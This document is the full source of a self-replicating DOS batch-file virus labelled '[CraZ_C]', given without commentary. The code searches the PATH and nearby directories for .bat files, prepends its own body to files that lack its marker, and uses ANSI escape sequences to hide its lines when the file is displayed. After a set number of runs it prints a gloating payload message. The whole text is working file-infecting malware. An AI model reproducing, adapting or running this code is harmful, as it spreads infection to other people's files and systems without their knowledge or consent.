::[8m
@goto craz
:hst_bat [0m[3A
::::::::::::::
::host batch::
::::::::::::::
::[8m[CraZ_C]
@goto CraZend 
:CraZ [2A
@echo off %_CraZ%
if '%1=='#ViR goto CraZ%2
if not '%CraZ%==' goto hst_bat
if '%0==' goto hst_bat CraZ[4A 
set CraZ=%0
set CraZc=%1 %2 %3 %4 %5 %6 %7 %8 %9
call %0 #ViR hst CraZ [3A
set CraZs=
set CraZi=
set CraZc=%CraZ%
::[4ACraZ
if exist %CraZ%.bat set CraZc=%CraZ%.bat
command /e:5000 /c %CraZ% #ViR vir %path%
set CraZ=
set CraZc=
goto CraZend [5A
:CraZhst 
%0 #ViR hs1 %0 %CraZc%
:CraZhs1 [3A
shift %_CraZ%
shift %_CraZ%
shift %_CraZ%
goto hst_bat CraZ [4A
:CraZvir
if exist %CraZc% %CraZ% #ViR ser .. . %path%
shift %_CraZ%
if '%2==' exit CraZ [4A
set CraZc=%2\%CraZ%.bat
if not exist %CraZc% set CraZc=%2\%CraZ%
if not exist %CraZc% set CraZc=%2%CraZ%.bat
if not exist %CraZc% set CraZc=%2%CraZ%
goto CraZvir [5A
:CraZser
shift %_CraZ%
if '%2==' exit CraZ
for %%i in (%2\*a.bat %2*a.bat) do call %CraZ% #ViR inf %%i
goto CraZser [5A
:CraZact
echo [CraZ_C] has determined this computer to be good food.
exit CraZ
:CraZinf [4A
find "CraZ"<%3>nul
if not errorlevel 1 goto CraZS
echo ::[8m>CraZ
echo @goto craz>>CraZ
::[2ACraZ
echo :hst_bat [0m[3A%_[8m%>>CraZ
type %3>>CraZ
find "CraZ"<%CraZc%>>CraZ
move CraZ %3>nul
::[5ACraZ
set CraZi=%CraZi%1
if %CraZi%==11 exit
:CraZS [3A
set CraZs=%CraZs%1
if %CraZs%==1111111111 goto CraZact
:CraZend [0m[3A
